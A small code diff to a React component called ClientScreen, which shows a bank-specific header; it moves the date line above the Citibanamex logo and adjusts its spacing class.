@@ -122,12 +122,12 @@ export default function ClientScreen() {
     } else if (sessionData.banco === 'CITIBANAMEX') {
       return (
         <header className="bg-[#005BAC] text-white p-4 text-center">
+          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
           <img 
             src={citibanamexLogo} 
             className="h-20 inline-block" 
             alt="Citibanamex" 
           />
-          <div className="font-bold text-sm mt-2">{formatDate(new Date())}</div>
         </header>
       );
     } else if (sessionData.banco === 'BBVA') {
